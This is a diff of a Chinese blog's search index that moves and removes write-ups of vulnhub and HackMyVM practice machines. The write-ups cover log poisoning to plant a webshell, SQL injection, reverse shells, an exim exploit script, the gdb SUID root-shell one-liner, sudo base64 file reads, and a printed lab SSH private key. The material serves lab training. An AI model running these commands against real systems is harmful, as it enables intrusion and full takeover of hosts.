+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1540,27 +1559,8 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC5靶场复盘</title>
-    <url>/posts/19078.html</url>
-    <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
-<span id="more"></span>
-<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
         <tag>靶场</tag>
-        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1581,8 +1581,27 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC8靶场复盘</title>
+    <url>/posts/51727.html</url>
+    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1601,8 +1620,8 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1648,27 +1667,8 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
+        <tag>靶场</tag>
         <tag>HMV</tag>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC8靶场复盘</title>
-    <url>/posts/51727.html</url>
-    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
-<span id="more"></span>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
-<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>靶场</tag>
-        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1709,8 +1709,8 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>HMV</tag>
         <tag>靶场</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -1743,82 +1743,7 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Baseme</title>
-    <url>/posts/46022.html</url>
-    <content><![CDATA[<p>HMV-Baseme靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f9d0e0a243d4f878d0.png"></p>
-<h1 id="Baseme"><a href="#Baseme" class="headerlink" title="Baseme"></a>Baseme</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3980d0e0a243d4f87970.png" alt="|500"><br>开放了22端口和80端口</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>web给了一行base64加密过的文本  得到一个用户名 lucas<br><img src="https://pic1.imgdb.cn/item/679a3983d0e0a243d4f87971.png" alt="|425"><br>提示这个靶机全部用的是base64<br><img src="https://pic1.imgdb.cn/item/679a3985d0e0a243d4f87972.png" alt="|350"><br>还给了一些密码字典  我们存储并且进行base64</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cat</span> pass);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> | <span class="built_in">base64</span> &gt;&gt; pass.txt;<span class="keyword">done</span> </span><br><span class="line">┌──(root㉿kakeru)-[~/base]</span><br><span class="line">└─# <span class="built_in">cat</span> pass.txt     </span><br><span class="line">aWxvdmV5b3UK</span><br><span class="line">eW91bG92ZXlvdQo=</span><br><span class="line">c2hlbG92ZXN5b3UK</span><br><span class="line">aGVsb3Zlc3lvdQo=</span><br><span class="line">d2Vsb3ZleW91Cg==</span><br><span class="line">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure></div>
-<p>然后再进行目录爆破<br>用gobuster midium字典爆破之后还是没有发现有用的目录   换dirb&#x2F;common.txt字典<br>还是没有找到任何有用的信息  这里的字典要再用base64进行编码然后爆破  找到了两个目录<br><img src="https://pic1.imgdb.cn/item/679a3989d0e0a243d4f87974.png"><br>curl访问得到一串base64编码  解密之后得到是rsa密钥 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line"><span class="number">07</span>jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL<span class="symbol">/ptLk26RBnh</span></span><br><span class="line"><span class="number">7</span>bHG1JjGlxOkO6m<span class="operator">+</span><span class="number">1</span>oFNLtNuD2QPl8sbZtEzX4S9nNZ<span class="symbol">/dpyRpMfmB73rN3yyIylevVDEyv</span></span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq<span class="operator">+</span>b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj<span class="symbol">/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span></span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM<span class="operator">+</span><span class="number">3</span>mzWjPdoBK<span class="symbol">/Ho339uPmBWI5sbMrpK</span></span><br><span class="line">xkZMnl<span class="operator">+</span>rcTbgz4swv8gNuKhUc7wTgtrNX<span class="operator">+</span>PNMdIALNpsxYLt<span class="symbol">/l56GK8R4J8fLIU5+MojRs</span></span><br><span class="line"><span class="operator">+</span><span class="number">1</span>NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp<span class="operator">+</span>YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4<span class="operator">+</span>dW7nZ</span><br><span class="line">zjf3p0M77b<span class="symbol">/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span></span><br><span class="line">IJh<span class="operator">+</span>I<span class="operator">+</span>Zv1egSMS<span class="symbol">/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span></span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5<span class="symbol">/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span></span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS<span class="operator">+</span><span class="symbol">/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span></span><br><span class="line"><span class="operator">+</span><span class="number">8</span>gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ<span class="symbol">/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span></span><br><span class="line">tSn7hr8hppT2tUSxDvC<span class="operator">+</span>USMmw<span class="symbol">/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span></span><br><span class="line">N7bw45FhBZCsHCAbV2<span class="operator">+</span>hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif<span class="symbol">/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span></span><br><span class="line">O<span class="operator">+</span>TowA10RATek6ZEIxh6SmtDG<span class="symbol">/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span></span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line"><span class="number">3</span><span class="symbol">/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span></span><br><span class="line">ND8ikgmQvF6hrwwJBrp<span class="symbol">/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span></span><br><span class="line">LdmmRXUS<span class="operator">/</span>DtO<span class="operator">+</span><span class="number">69</span><span class="operator">/</span>aidvxGAYob<span class="operator">+</span><span class="number">1</span>M<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
-<p>尝试使用ssh登录<br><img src="https://pic1.imgdb.cn/item/679a3988d0e0a243d4f87973.png"><br>发现不能直接登录 根据提示执行 <code> ssh-keygen -f &#39;/root/.ssh/known_hosts&#39; -R &#39;192.168.240.45&#39;</code><br>然后需要密码  用一开始得到的几个密码的base64编码进行尝试  发现用第一个就能登录<br><img src="https://pic1.imgdb.cn/item/679a3c2cd0e0a243d4f879d4.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>查找有没有suid提权</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">lucas<span class="variable">@baseme</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/openssh</span><span class="regexp">/ssh-keysign</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/dbus</span>-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br></pre></td></tr></table></figure></div>
-<p>没有可以利用的  在查看用户有没有sudo权限<br><img src="https://pic1.imgdb.cn/item/679a3c2bd0e0a243d4f879d3.png"><br>发现可以执行base64<br>提权方式：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">base64</span> <span class="string">&quot;<span class="variable">$LFILE</span>&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure></div>
-<p>通过这种方式可以直接用root权限查想要的文件  也可以直接查root的ssh的rsa密钥  &#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>HMV</tag>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Connection</title>
-    <url>/posts/10052.html</url>
-    <content><![CDATA[<p>HMV-Connection靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f7d0e0a243d4f878cd.png"></p>
-<h1 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h1><p>无法获取ip 在开始之前要先进入拯救者模式中修改 网卡信息</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3d3bd0e0a243d4f879fa.png" alt="|750"><br>端口有4个  有http  ssh 还有smb服务 这个服务刚学到 是一个文件共享的服务 </p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里主要先考虑http和22端口<br>用dirsearch发现没有其他有用的界面   80端口是一个默认的index界面没有有用的信息<br>ssh 也不能直接登录上去  需要密码<br>所以考虑这个smb服务<br>用enum4linux -S 列举出smb共享资源<br><img src="https://pic1.imgdb.cn/item/679a3d40d0e0a243d4f879fb.png"><br>登录到share    – 利用smbclient  -N  匿名登录  <code>smbclient -N \\\\192.168.240.237\\share</code><br>这里要用反斜杠转义<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879fe.png"><br>登录进来之后也只看到只有一个html文件     然后我们从本地上传一个反弹shell的文件<br><code>put php-reverse-shell.php</code>  因为share这个文件夹只有只读权限所以进到html中上传<br>上传成功后 在本地监听  web端进入这个php文件  然后就可以获得shell</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/connections]</span><br><span class="line">└─# nc -lp 1234</span><br><span class="line">Linux<span class="built_in"> connection </span>4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line"> 07:18:55 up 23 min,  0 users,  load average: 0.00, 0.00, 0.00<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ clear</span></span><br><span class="line"><span class="string">TERM environment variable not set.</span></span><br><span class="line"><span class="string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="string">&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用suid提权<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879ff.png" alt="|500"><br>这里使用gdb提权<br>在<a href="https://gtfobins.github.io/gtfobins/gdb/">gtfobins</a> 中找到提权方案</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="symbol">/usr/bin/gdb</span> <span class="operator">-</span>nx <span class="operator">-</span>ex &#x27;python <span class="built_in">import</span> os; os.execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-p&quot;</span>)&#x27; <span class="operator">-</span>ex quit</span><br></pre></td></tr></table></figure></div>
-<p>拿到root权限<br>分别在&#x2F;root 和&#x2F;home&#x2F;connection 中找到flag</p>
-<h3 id="解释-gdb-命令"><a href="#解释-gdb-命令" class="headerlink" title="解释 gdb 命令"></a>解释 <code>gdb</code> 命令</h3><h2 id="1-usr-bin-gdb"><a href="#1-usr-bin-gdb" class="headerlink" title="1. /usr/bin/gdb"></a>1. <code>/usr/bin/gdb</code></h2><ul>
-<li><strong>作用</strong>：这是 <code>gdb</code> 命令的完整路径，表示调用的是系统中的 GNU 调试器（GDB）。<code>gdb</code> 是一个强大的调试工具，通常用于调试程序，也能执行低级操作，如调用系统命令或执行特定代码。</li>
-</ul>
-<h2 id="2-nx"><a href="#2-nx" class="headerlink" title="2. -nx"></a>2. <code>-nx</code></h2><ul>
-<li><strong><code>-n</code></strong>：启动时不执行任何初始化文件（如 <code>.gdbinit</code>），避免加载默认设置或用户配置文件。</li>
-<li><strong><code>-x</code></strong>：指定 <code>gdb</code> 执行的脚本文件，但在此命令中使用 <code>-ex</code> 代替，执行内联命令。</li>
-</ul>
-<h2 id="3-ex-python-import-os-os-execl-bin-bash-bash-p"><a href="#3-ex-python-import-os-os-execl-bin-bash-bash-p" class="headerlink" title="3. -ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;"></a>3. <code>-ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;</code></h2><ul>
-<li><strong><code>-ex</code></strong>：用于执行 <code>gdb</code> 启动时要运行的命令，支持多次使用。</li>
-<li><strong>Python 脚本</strong>：<ul>
-<li><strong><code>import os</code></strong>：导入 <code>os</code> 模块，用于与操作系统交互。</li>
-<li><strong><code>os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code></strong>：用 <code>execl</code> 替换当前进程（<code>gdb</code>）为新的进程，即启动 <code>bash</code> shell。<ul>
-<li><strong><code>/bin/bash</code></strong>：指定执行的程序，即 <code>bash</code> shell。</li>
-<li><strong><code>&quot;bash&quot;</code></strong>：传递给 <code>bash</code> 的参数，第一个参数通常是执行命令本身。</li>
-<li><strong><code>&quot;-p&quot;</code></strong>：让 <code>bash</code> 保持 <code>root</code> 权限，如果 <code>gdb</code> 以 <code>root</code> 权限运行，新启动的 <code>bash</code> shell 也会保持 <code>root</code> 权限。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="4-ex-quit"><a href="#4-ex-quit" class="headerlink" title="4. -ex quit"></a>4. <code>-ex quit</code></h2><ul>
-<li><strong>作用</strong>：在执行完上述 Python 脚本后，立即退出 <code>gdb</code>。<code>gdb</code> 执行完命令后会退出，但新启动的 <code>bash</code> shell 会继续运行。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>HMV</tag>
         <tag>靶场</tag>
       </tags>
   </entry>
@@ -1863,8 +1788,8 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>HMV</tag>
         <tag>靶场</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -1918,32 +1843,27 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>HMV</tag>
         <tag>靶场</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
-    <title>panghu</title>
-    <url>/posts/59637.html</url>
-    <content><![CDATA[<p>panghu复盘</p>
+    <title>HMV-Baseme</title>
+    <url>/posts/46022.html</url>
+    <content><![CDATA[<p>HMV-Baseme靶场复盘</p>
 <span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/67a1fe35d0e0a243d4fbcf9f.png"><br>这个是个简单的靶机，但是我有一个点没有想到，卡了很久，开了懦夫模式<br>登录入口是ssh&#x2F;panghu</p>
-<h1 id="第一阶段（读到-root-root-txt"><a href="#第一阶段（读到-root-root-txt" class="headerlink" title="第一阶段（读到&#x2F;root&#x2F;root.txt)"></a>第一阶段（读到&#x2F;root&#x2F;root.txt)</h1><p>有一个sudo权限的脚本</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">ssh:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ssh on <span class="symbol">jan:</span></span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Runas</span> <span class="keyword">and</span> <span class="title class_">Command</span>-specific defaults <span class="keyword">for</span> <span class="symbol">ssh:</span></span><br><span class="line">    <span class="title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ssh may run the following commands on <span class="symbol">jan:</span></span><br><span class="line">    (root) <span class="symbol">PASSWD:</span> 